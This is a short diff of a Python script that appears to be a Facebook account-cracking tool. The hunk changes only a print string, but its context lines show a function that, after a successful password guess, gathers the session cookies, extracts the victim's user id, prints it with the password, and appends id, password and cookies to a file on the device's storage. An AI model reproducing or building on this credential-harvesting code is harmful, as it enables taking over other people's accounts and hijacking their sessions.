@@ -995,7 +995,7 @@ def m4(idx,pwv):
         coki=po.cookies.get_dict()
         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
         idf = re.findall('c_user=(.*);xs', kuki)[0]
-        print(f'\r{P} [{HCRACKED-OK{P}] {GREEN}{idf}|{pw}{xxx}')
+        print(f'\r{P} [{CRACKED-OK{P}] {GREEN}{idf}|{pw}{xxx}')
         if 'y' in cokix:
          print(f'\r{gen}{H}'+kuki)
         open(' /sdcard/ULTRA-GREEN-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
